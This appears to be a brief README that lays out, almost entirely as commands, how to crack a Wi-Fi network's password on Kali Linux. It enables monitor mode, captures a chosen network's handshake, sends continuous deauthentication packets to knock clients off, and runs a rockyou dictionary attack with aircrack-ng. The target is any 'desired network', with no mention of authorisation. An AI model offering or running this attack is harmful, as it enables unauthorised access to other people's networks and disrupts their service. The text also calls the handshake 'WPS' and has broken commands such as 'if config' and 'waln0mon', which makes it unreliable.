# WIFI-CRACK-USING-KALI-LINUX

# NOTE:
This technique will search the password after taking WPS handshake. All commands should be run on kali linux terminal.
The rockyou.txt file contains a large amount of passwords.

## COMMANDS:

>*open terminal and type the directory*
- /usr/share/wordlists/rockyou.txt.gz
>*ls command will show the files and folders in directory*
- ls
>*unzip the rockyou file using command*
- gunzip rockyou.txt.gz

>*open new terminal*
- if config
- airmon-ng start wlan0
- airmon-ng check kill
- airodump-ng waln0mon
>*shows network around you and when you see your desired network you can stop searching using ctril+c*

- airodump-ng -w test -c *target-network's-channel* --bssid *target-network's-mac-address* waln0mon

>*open new terminal*
- aireplay-ng -0 0 -a *target-network's-mac* wlan0mon

>*go to the window where you extract the rockyou file*
- aircrack-ng -w rockyou.txt test-01.cap

## NOTE:
remember to replace the *target-network's-channel* and *target-network's-mac-address* with your desired network info.
